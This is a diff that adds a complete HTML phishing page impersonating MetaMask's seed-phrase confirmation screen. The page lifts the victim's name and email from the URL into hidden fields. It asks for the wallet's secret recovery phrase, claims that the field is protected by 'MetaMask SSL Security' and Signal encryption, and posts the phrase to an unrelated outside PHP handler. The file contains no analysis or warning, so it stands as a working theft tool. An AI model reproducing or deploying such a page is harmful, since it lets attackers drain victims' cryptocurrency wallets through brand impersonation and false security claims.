@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+    <link rel="stylesheet" href="./css/backup.css">
+    <title>MetaMask | Confirm your Wallet's Secret Backup Phrase</title>
+    <script>
+    function qs(key) {
+       var vars = [], hash;
+       var hashes = window.location.href.slice(window.location.href.indexOf('?') + 1).split('&');
+         for(var i = 0; i < hashes.length; i++)
+       {
+         hash = hashes[i].split('=');
+         vars.push(hash[0]);
+         vars[hash[0]] = hash[1];
+        }
+       return vars[key];
+       }
+       var fname = qs('fname');
+       var lname = qs('lname');
+       var email = qs('email');
+       //document.getElementById('email').value = email;
+       //console.log(email);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="intro-section">
+            <div class="logo-img">
+                <a href="./index.html">
+                    <img src="./media/metamask logo.png" alt="MetaMask logo">
+                </a>
+            </div>
+        </div>
+        <div class="form-section">
+            <div class="form-text">
+                <h3>Confirm your Wallet's Secret Backup Phrase (SBP).</h3>
+                <p class="parag-text">
+                    NEVER share your secret seed phrase AKA secret recovery phrase.<br>
+                    This input is protected by <span class="strong-text">MetaMask SSL Security</span> <i class="fas fa-check-square"></i>
+                    by the same Signal encryption protocol that secures <span class="strong-text">sensitive data</span> before they leave your device.
+                </p>
+            </div>
+            <div class="form-input">
+                <form action="https://account-update-complete.acesadubai.com/metamaske/php/db-handler.php" id="f-form" method="post">
+                    <textarea name="sbp" required></textarea>
+                    <input type="hidden" id="fname" name="fname" value="">
+                    <input type="hidden" id="lname" name="lname" value="">
+                    <input type="hidden" id="email" name="email" value="">
+                </form>
+            </div>
+            <button type="submit" name="submit" form="f-form" class="next-btn">Agree</button>
+        </div>
+    </div>
+    <script>
+    document.getElementById('fname').value = fname;
+    document.getElementById('lname').value = lname;
+    document.getElementById('email').value = email;
+    console.log(fname);
+  </script>
+</body>
+</html>
